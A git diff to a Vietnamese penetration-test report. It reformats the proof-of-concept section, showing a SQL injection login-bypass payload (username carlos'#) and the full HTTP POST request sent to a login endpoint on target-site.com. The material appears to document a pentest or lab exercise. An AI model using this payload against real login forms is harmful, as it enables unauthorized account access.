@@ -91,17 +91,19 @@ Website được xây dựng theo mô hình **MVC (Model-View-Controller)** và 
 ## 🛠 PoC - Bằng Chứng Khai Thác
 📌 1. Payload Tấn Công:
 --------------------------------
+```
 Username: carlos'#
 Password: (bất kỳ)
-
+```
 🖥 2. Request Gửi Đến Server:
 --------------------------------
-POST /login.php HTTP/1.1
+```
+POST /web_pen_v1/login/process HTTP/1.1
 Host: target-site.com
 Content-Type: application/x-www-form-urlencoded
 
 username=carlos'#&password=randompassword
-
+```
 🛠 3. Truy Vấn SQL Bị Thao Túng:
 --------------------------------
 ```
